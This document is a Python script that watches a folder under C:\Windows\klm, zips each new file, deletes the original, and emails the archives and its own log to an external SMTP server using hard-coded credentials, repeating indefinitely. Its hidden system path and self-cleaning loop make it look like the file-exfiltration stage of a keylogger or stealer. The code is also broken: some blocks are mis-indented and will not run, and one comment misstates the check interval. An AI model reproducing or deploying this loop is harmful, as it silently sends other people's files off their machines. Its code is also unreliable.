import os
import smtplib
import time
import logging
import zipfile
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Set up logging
log_directory = "C:\\Windows\\klm\\logs"
output_directory = "C:\\Windows\\klm\\output"
os.makedirs(log_directory, exist_ok=True)
os.makedirs(output_directory, exist_ok=True)
logging.basicConfig(filename=os.path.join(log_directory, 'folder_monitor.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

EMAIL_ADDRESS = "071bfafc4dde91"
EMAIL_PASSWORD = "9918ecc6a25877"
CHECK_INTERVAL = 600  # Check every 15 minutes
MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # 5 MB

class FolderMonitor:
    def __init__(self, directory, email, password):
        self.directory = directory
        self.email = email
        self.password = password
        logging.info("FolderMonitor initialized")

    def zip_file(self, file_path):
        zip_path = file_path + '.zip'
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(file_path, os.path.basename(file_path))
        os.remove(file_path)  # Delete the original file after zipping
        logging.info(f"Deleted original file: {file_path}")
        return zip_path

    def get_folder_contents(self):
        contents = "Output folder contents:\n"
        for f in os.listdir(self.directory):
            file_path = os.path.join(self.directory, f)
            if os.path.isfile(file_path):
                file_size = os.path.getsize(file_path)
                contents += f"{f} - {file_size / (1024 * 1024):.2f} MB\n"
        return contents

    def send_mail(self, email, password, subject, message, attachment_paths=None):
        total_sent = 0
        current_msg = MIMEMultipart()
        current_msg['From'] = email
        current_msg['To'] = email
        current_msg['Subject'] = subject

        # Read log file and add to the message
        with open(os.path.join(log_directory, 'folder_monitor.log'), 'r') as log_file:
            log_content = log_file.read()

        # Get folder contents and add to the message
        folder_contents = self.get_folder_contents()

        email_body = message + "\n\nLog entries:\n" + log_content + "\n\n" + folder_contents
        current_msg.attach(MIMEText(email_body, 'plain'))

        if attachment_paths:
            attachment_paths.sort(key=os.path.getsize, reverse=True)  # Start with largest file to manage space

            for attachment_path in attachment_paths:
                if os.path.exists(attachment_path):
                    file_size = os.path.getsize(attachment_path)
                    if file_size > MAX_ATTACHMENT_SIZE:
                        logging.info(f"File {attachment_path} exceeds 5MB and will be ignored.")
                        continue
                    # Check if adding this file would exceed the limit
                    if total_sent + file_size > MAX_ATTACHMENT_SIZE:
                        # Send current message before adding more attachments
                        self.smtp_send(email, password, current_msg)
                        total_sent = 0  # Reset counter after sending
                        current_msg = MIMEMultipart()  # Start new message
                        current_msg['From'] = email
                        current_msg['To'] = email
                        current_msg['Subject'] = subject
                        current_msg.attach(MIMEText(email_body, 'plain'))

                    with open(attachment_path, "rb") as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                        current_msg.attach(part)
                        total_sent += file_size

            if total_sent > 0:  # There's still content to send
                self.smtp_send(email, password, current_msg)

            # Only delete files if they were added to a successful email
            for attachment_path in attachment_paths:
                if os.path.exists(attachment_path):
                    os.remove(attachment_path)
                    logging.info(f"Deleted zip file: {attachment_path}")

    def smtp_send(self, email, password, msg):
        try:
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
        logging.info("Email sent successfully with attachments.")
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def check_folder(self):
        while True:
            files = [os.path.join(self.directory, f) for f in os.listdir(self.directory) if os.path.isfile(os.path.join(self.directory, f))]
            if files:
                zipped_files = []
                for file in files:
                    try:
                        zip_path = self.zip_file(file)
                        if os.path.getsize(zip_path) > MAX_ATTACHMENT_SIZE:
                            logging.info(f"File {zip_path} exceeds 5MB and will be ignored.")
                        else:
                        zipped_files.append(zip_path)
                    except Exception as e:
                        logging.error(f"Failed to zip file {file}: {e}")

                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                subject = f"Files Report - {timestamp}"
                try:
                    self.send_mail(self.email, self.password, subject, "Please find the attached files.", zipped_files)
                except Exception as e:
                    logging.error(f"Failed to send zipped files: {e}")

            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    folder_monitor = FolderMonitor(output_directory, EMAIL_ADDRESS, EMAIL_PASSWORD)
    folder_monitor.check_folder()
